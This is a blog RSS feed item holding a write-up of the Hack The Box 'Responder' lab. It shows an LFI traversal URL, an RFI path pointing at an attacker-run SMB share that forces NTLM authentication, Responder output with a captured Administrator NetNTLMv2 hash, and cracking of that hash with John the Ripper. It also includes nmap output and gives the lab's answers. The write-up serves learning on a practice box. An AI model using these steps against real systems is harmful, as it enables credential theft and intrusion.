@@ -1,0 +1,772 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>LFI - Tag - Pascal's Blog</title><link>https://blog.ppeinecke.de/tags/lfi/</link><description>LFI - Tag - Pascal's Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 13 Sep 2022 19:31:57 +0200</lastBuildDate><atom:link href="https://blog.ppeinecke.de/tags/lfi/" rel="self" type="application/rss+xml"/><item><title>HTB - Starting Point - Responder</title><link>https://blog.ppeinecke.de/posts/htb-starting-point-responder/</link><pubDate>Tue, 13 Sep 2022 19:31:57 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/htb-starting-point-responder/</guid><description><![CDATA[<h1 id="htb---starting-point-responder---writeup">HTB - Starting Point: Responder - writeup:</h1>
+<h2 id="target-ip-address">Target IP Address:</h2>
+<p>10.129.17.20</p>
+<p><code>export IP=&quot;10.129.17.20&quot;</code></p>
+<h1 id="tasks">Tasks</h1>
+<h2 id="task1-when-visiting-the-web-service-using-the-ip-address-what-is-the-domain-that-we-are-being-redirected-to">Task1: When visiting the web service using the IP address, what is the domain that we are being redirected to?</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="nv">$IP</span>          
+</span></span><span class="line"><span class="cl">&lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;refresh&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;0;url=http://unika.htb/&#34;</span>&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>A: unika.htb</p>
+<h2 id="task2-which-scripting-language-is-being-used-on-the-server-to-generate-webpages">Task2: Which scripting language is being used on the server to generate webpages?</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nikto -h http://<span class="nv">$IP</span>      
+</span></span><span class="line"><span class="cl">perl: warning: Setting locale failed.
+</span></span><span class="line"><span class="cl">perl: warning: Please check that your locale settings:
+</span></span><span class="line"><span class="cl">        <span class="nv">LANGUAGE</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="nv">LC_ALL</span> <span class="o">=</span> <span class="o">(</span><span class="nb">unset</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">        <span class="nv">LANG</span> <span class="o">=</span> <span class="s2">&#34;de_DE.UTF-8&#34;</span>
+</span></span><span class="line"><span class="cl">    are supported and installed on your system.
+</span></span><span class="line"><span class="cl">perl: warning: Falling back to the standard locale <span class="o">(</span><span class="s2">&#34;C&#34;</span><span class="o">)</span>.
+</span></span><span class="line"><span class="cl">- Nikto v2.1.6
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Target IP:          10.129.128.80
+</span></span><span class="line"><span class="cl">+ Target Hostname:    10.129.128.80
+</span></span><span class="line"><span class="cl">+ Target Port:        <span class="m">80</span>
+</span></span><span class="line"><span class="cl">+ Start Time:         2022-09-13 15:56:59 <span class="o">(</span>GMT2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Server: Apache/2.4.52 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1m PHP/8.1.1
+</span></span><span class="line"><span class="cl">+ Retrieved x-powered-by header: PHP/8.1.1
+</span></span><span class="line"><span class="cl">+ The anti-clickjacking X-Frame-Options header is not present.
+</span></span><span class="line"><span class="cl">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span></span><span class="line"><span class="cl">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>A: PHP</p>
+<h2 id="task3-what-is-the-name-of-the-url-parameter-which-is-used-to-load-different-language-versions-of-the-webpage">Task3: What is the name of the URL parameter which is used to load different language versions of the webpage?</h2>
+<p>A: page</p>
+<h2 id="task4-which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-local-file-include-lfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Task4: Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h2>
+<p>I was able to exploit LFI like so:</p>
+<p><code>http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</code></p>
+<p>A: <a href="http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts" target="_blank" rel="noopener noreffer">http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</a></p>
+<h2 id="task5-which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-remote-file-include-rfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Task5: Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h2>
+<p>A: //10.10.14.6/somefile</p>
+<h2 id="task6-what-does-ntlm-stand-for">Task6: What does NTLM stand for?</h2>
+<p>A: New Technology LAN Manager</p>
+<h2 id="task7-which-flag-do-we-use-in-the-responder-utility-to-specify-the-network-interface">Task7: Which flag do we use in the Responder utility to specify the network interface?</h2>
+<p>A: -I</p>
+<h2 id="task8-there-are-several-tools-that-take-a-netntlmv2-challengeresponse-and-try-millions-of-passwords-to-see-if-any-of-them-generate-the-same-response-one-such-tool-is-often-referred-to-as-john-but-the-full-name-is-what">Task8: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?.</h2>
+<p>A: John the Ripper</p>
+<h2 id="task9-what-is-the-password-for-the-administrator-user">Task9: What is the password for the administrator user?</h2>
+<p>I was able to run responder and capture hashes by using RFI like mentioned in the bonus section to sideload the php meterpreter file and gaining a shell.</p>
+<p>Responder was then able to capture hashes.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo responder -i 10.10.16.156 -I tun0
+</span></span><span class="line"><span class="cl">                                         __
+</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.1.3.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  To support this project:
+</span></span><span class="line"><span class="cl">  Patreon -&gt; https://www.patreon.com/PythonResponder
+</span></span><span class="line"><span class="cl">  Paypal  -&gt; https://paypal.me/PythonResponder
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
+</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    MDNS                       <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DNS                        <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DHCP                       <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Servers:
+</span></span><span class="line"><span class="cl">    HTTP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    HTTPS server               <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    WPAD proxy                 <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Auth proxy                 <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SMB server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Kerberos server            <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SQL server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    FTP server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    IMAP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    POP3 server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SMTP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DNS server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    LDAP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    RDP server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DCE-RPC server             <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    WinRM server               <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> HTTP Options:
+</span></span><span class="line"><span class="cl">    Always serving EXE         <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Serving EXE                <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Serving HTML               <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Upstream Proxy             <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoning Options:
+</span></span><span class="line"><span class="cl">    Analyze Mode               <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force WPAD auth            <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force Basic Auth           <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force LM downgrade         <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force ESS downgrade        <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generic Options:
+</span></span><span class="line"><span class="cl">    Responder NIC              <span class="o">[</span>tun0<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder IP               <span class="o">[</span>10.10.16.156<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder IPv6             <span class="o">[</span>dead:beef:4::109a<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Challenge <span class="nb">set</span>              <span class="o">[</span>random<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Don<span class="s1">&#39;t Respond To Names     [&#39;</span>ISATAP<span class="err">&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current Session Variables:
+</span></span><span class="line"><span class="cl">    Responder Machine Name     <span class="o">[</span>WIN-56MT5U5SZ1U<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder Domain Name      <span class="o">[</span>8EZQ.LOCAL<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder DCE-RPC Port     <span class="o">[</span>49418<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After pointing my browser to <code>http://unika.htb/index.php?page=\\10.10.16.156\ica\payload.php</code></p>
+<p>I can capture a connection and dump NTLMv2 hashes:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.129.17.20
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : RESPONDER<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : Administrator::RESPONDER:6b65ae6b782b3399:09D597B083E4F1DF38284708ABA04FF5:010100000000000080EBBCED97C7D801950D5D5965F82A570000000002000800380045005A00510001001E00570049004E002D00350036004D00540035005500350053005A003100550004003400570049004E002D00350036004D00540035005500350053005A00310055002E00380045005A0051002E004C004F00430041004C0003001400380045005A0051002E004C004F00430041004C0005001400380045005A0051002E004C004F00430041004C000700080080EBBCED97C7D80106000400020000000800300030000000000000000100000000200000436D29F868457D28FCAC25E68C0588549FE2A0096D761D40A34735311B31BE5E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350036000000000000000000
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I saved the ntlm2 hash to a file <code>ntlm2_hash</code> and now I will try to crack the hash using John the Ripper!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">john ntlm2_hash --wordlist=/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+</span></span><span class="line"><span class="cl">Will run 8 OpenMP threads
+</span></span><span class="line"><span class="cl">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="line"><span class="cl">badminton        (Administrator)     
+</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE (2022-09-13 17:55) 11.11g/s 45511p/s 45511c/s 45511C/s 123456..oooooo
+</span></span><span class="line"><span class="cl">Use the &#34;--show --format=netntlmv2&#34; options to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I am using the password list
+<code>rockyou.txt</code> here because it contains the most commonly used passwords.</p>
+<p><code>john</code> was immediately able to crack the hash.</p>
+<p>The password of the <code>Administrator</code> account is <code>badminton</code></p>
+<h2 id="task10-well-use-a-windows-service-ie-running-on-the-box-to-remotely-access-the-responder-machine-using-the-password-we-recovered-what-port-tcp-does-it-listen-on">Task10: We&rsquo;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</h2>
+<p>A: 5985</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -v 10.10.16.156 -p-
+</span></span><span class="line"><span class="cl">Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-09-13 18:03 CEST
+</span></span><span class="line"><span class="cl">Initiating Ping Scan at 18:03
+</span></span><span class="line"><span class="cl">Scanning 10.10.16.156 <span class="o">[</span><span class="m">2</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Completed Ping Scan at 18:03, 0.00s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Initiating Parallel DNS resolution of <span class="m">1</span> host. at 18:03
+</span></span><span class="line"><span class="cl">Completed Parallel DNS resolution of <span class="m">1</span> host. at 18:03, 0.00s elapsed
+</span></span><span class="line"><span class="cl">Initiating Connect Scan at 18:03
+</span></span><span class="line"><span class="cl">Scanning 10.10.16.156 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 139/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 3389/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 53/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 443/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 445/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 25/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 110/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 21/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 135/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 587/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 143/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 5986/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 88/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 45107/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 5985/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Discovered open port 1433/tcp on 10.10.16.156
+</span></span><span class="line"><span class="cl">Completed Connect Scan at 18:03, 1.87s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.16.156
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00012s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65517</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
+</span></span><span class="line"><span class="cl">21/tcp    open  ftp
+</span></span><span class="line"><span class="cl">25/tcp    open  smtp
+</span></span><span class="line"><span class="cl">53/tcp    open  domain
+</span></span><span class="line"><span class="cl">80/tcp    open  http
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec
+</span></span><span class="line"><span class="cl">110/tcp   open  pop3
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn
+</span></span><span class="line"><span class="cl">143/tcp   open  imap
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap
+</span></span><span class="line"><span class="cl">443/tcp   open  https
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
+</span></span><span class="line"><span class="cl">587/tcp   open  submission
+</span></span><span class="line"><span class="cl">1433/tcp  open  ms-sql-s
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server
+</span></span><span class="line"><span class="cl">5985/tcp  open  wsman
+</span></span><span class="line"><span class="cl">5986/tcp  open  wsmans
+</span></span><span class="line"><span class="cl">45107/tcp open  unknown
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On port 5985 is the service <code>wsman</code> running. wsman stands for WS-Management. This is a WinRM service. This provides access to Web Services for Management.</p>
+<h2 id="submit-root-flag">Submit root flag</h2>
+<p>Let&rsquo;s get the latest versions of Responder and Evil-WinRm!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/lgandx/Responder
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">git clone https://github.com/Hackplayers/evil-winrm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next run Responder so it can listen for requests.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> Responder
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo python3 Responder.py -I tun0
+</span></span><span class="line"><span class="cl">                                         __
+</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">
